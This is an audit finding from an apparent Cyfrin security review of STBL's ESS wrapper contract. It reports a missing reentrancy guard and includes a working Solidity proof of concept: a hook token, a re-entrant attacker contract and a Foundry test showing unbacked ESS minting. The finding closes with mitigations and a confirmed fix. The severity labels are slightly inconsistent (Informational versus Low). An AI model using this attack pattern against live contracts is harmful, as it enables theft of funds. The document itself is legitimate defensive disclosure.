---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-4-2
ingested_at: '2026-07-26T07:14:09Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: ess_deposit has no reentrancy guard and sizes the ESS mint from a global balance
  delta
vuln_class: []
---

# ess_deposit has no reentrancy guard and sizes the ESS mint from a global balance delta

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_ESS_Wrapper1::_Wrapper_ess_deposit` sizes the ESS mint from a global USST balance delta taken across an external-call loop, with no reentrancy guard:

```solidity
uint256 balanceBefore = STBL_USST.balanceOf(address(this));
(lotID, ) = asset_issue(amounts);
uint256 balanceAfter = STBL_USST.balanceOf(address(this));
entry(msg.sender, balanceAfter - balanceBefore);
```

`asset_issue` loops the basket and calls `transferFrom` / `approve` on each token:

```solidity
for (uint256 i = 0; i < assetIDs.length; i++) {
    IERC20(Ratios[assetIDs[i]].token).transferFrom(msg.sender, address(this), _amount[i]);
    IERC20(Ratios[assetIDs[i]].token).approve(Ratios[assetIDs[i]].vault, _amount[i]);
    results[i] = iSTBL_Issuer(Ratios[assetIDs[i]].issuer).deposit(_amount[i]);
}
```

Neither `ess_deposit` nor `_Wrapper_ess_deposit` is `nonReentrant`, and `STBL_XLayer_Wrapper` inherits no `ReentrancyGuard`. If a basket token hands control to `from` (the caller) during `transferFrom`, by way of an ERC-777-style `tokensToSend` hook, that caller can re-enter `ess_deposit` between the two snapshots. The inner deposit credits `X` USST and mints `X` ESS. The outer call then reads `balanceAfter` already including `X` and mints `X + Y`, for `2X + Y` ESS against only `X + Y` USST received.

**Impact:** This is a latent hardening defect, not a currently-exploitable bug. `SPEC.md` describes every basket asset as a plain **ERC-20 token**, and the basket is fixed at `initialize`. `STBL_XLayer_Wrapper` has no post-deploy asset/ratio setter, and the wrapper performs no token-type validation. Against a plain-ERC-20 basket (the only configuration the spec contemplates), `transferFrom` yields no callback and the reentrancy path does not exist, so the deposit accounting is correct.

The exposure is conditional: *if* a hook-bearing token (ERC-777, or a bespoke token with a `transferFrom`-time sender callback) were ever placed in the basket, which nothing in the code prevents, the missing guard plus the global-`balanceOf`-delta mint sizing would allow a re-entrant deposit to double-count its USST inflow and mint unbacked ESS. Because no supported basket composition triggers it and the fix is a single cheap modifier, this is rated Low as a defense-in-depth recommendation.

**Proof of Concept:** The PoC injects a custom `HookToken` (ERC-777-style) as a basket asset, a configuration the spec does not contemplate, to show that, given such a token, the missing guard is exploitable. The two attack contracts and the test function:

```solidity
/// A "hook ERC20": transferFrom hands control to the `from` address first.
contract HookToken is ERC20 {
    address public hookTarget;
    constructor() ERC20("HookBasketToken", "HOOK") {}
    function mintVal(address account, uint256 _value) external { _mint(account, _value); }
    function setHookTarget(address t) external { hookTarget = t; }
    function decimals() public view virtual override returns (uint8) { return 18; }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (hookTarget != address(0) && from == hookTarget) {
            ITokenHook(hookTarget).onTokenTransfer();   // ERC777-style tokensToSend
        }
        return super.transferFrom(from, to, amount);
    }
}

/// Attacker: deposits once, and from inside the hook re-enters ess_deposit once.
contract ReentrantDepositor is ITokenHook {
    IEssDeposit public wrapper;
    uint256 public depositAmt;
    bool public entered;
    uint256 public reentryCount;

    function configure(address _wrapper, uint256 _amt) external { wrapper = IEssDeposit(_wrapper); depositAmt = _amt; }
    function approveToken(address token, address spender) external { ERC20(token).approve(spender, type(uint256).max); }
    function attack() external { wrapper.ess_deposit(depositAmt); }

    function onTokenTransfer() external override {
        if (entered) return;
        entered = true;
        reentryCount++;
        wrapper.ess_deposit(depositAmt);   // re-enter between balanceBefore/balanceAfter
    }
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

function test_DepositReentrancyDoubleMintsESS() public {
    uint256 depositAmt = 1_000 * 1e18;

    ReentrantDepositor attacker = new ReentrantDepositor();
    attacker.configure(address(xLayerWrapper), depositAmt);

    hookToken1.mintVal(address(attacker), 10_000_000 * 1e18);
    testToken2.mintVal(address(attacker), 10_000_000 * 1e18);
    attacker.approveToken(address(hookToken1), address(xLayerWrapper));
    attacker.approveToken(address(testToken2), address(xLayerWrapper));

    // the hook-enabled basket token notifies the attacker on transferFrom
    hookToken1.setHookTarget(address(attacker));

    // one outer ess_deposit, one re-entrant inner deposit from the hook
    attacker.attack();

    uint256 essSupply   = xLayerToken.totalSupply();
    uint256 attackerESS = xLayerToken.balanceOf(address(attacker));
    uint256 wrapperUSST = usst.balanceOf(address(xLayerWrapper));

    console.log("ESS total supply           :", essSupply);
    console.log("USST backing held by wrapper:", wrapperUSST);
    console.log("UNBACKED ESS (supply - USST):", essSupply - wrapperUSST);

    assertEq(attacker.reentryCount(), 1, "reentry did not occur");
    assertGt(essSupply, wrapperUSST, "ESS supply must not exceed USST backing");
    assertEq(attackerESS, essSupply, "all ESS minted to attacker");
}
```

Run output:

```text
Ran 1 test for foundry_test/PoC_H02_DepositReentrancy.t.sol:PoC_H02_DepositReentrancy
[PASS] test_DepositReentrancyDoubleMintsESS() (gas: 3324030)
Logs:
  ESS total supply           : 3000000000000000000000
  USST backing held by wrapper: 2000000000000000000000
  UNBACKED ESS (supply - USST): 1000000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

With a hook token in the basket, one re-entrant deposit mints `3000e18` ESS against `2000e18` USST backing. With the plain-ERC-20 basket the spec describes, the same path produces no callback and no over-mint.

**Recommended Mitigation:**
1. Inherit `ReentrancyGuardUpgradeable` and mark `ess_deposit` / `ess_withdraw` `nonReentrant`. This is cheap defense-in-depth that closes the path regardless of future basket composition.
2. Size the mint from the sum of each `iSTBL_Issuer.deposit` result rather than a global `balanceOf` delta.

**STBL:** Fixed in commit [17d16b4](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-ess-common/commit/17d16b43d5849688dadade820038edbba02fa56f).

**Cyfrin:** Verified. `STBL_XLayer_Wrapper` now inherits `ReentrancyGuardUpgradeable` and marks both `ess_deposit` and `ess_withdraw` as `nonReentrant`, closing the re-entry path that could have allowed a hook-bearing basket token to inflate the global USST balance delta.
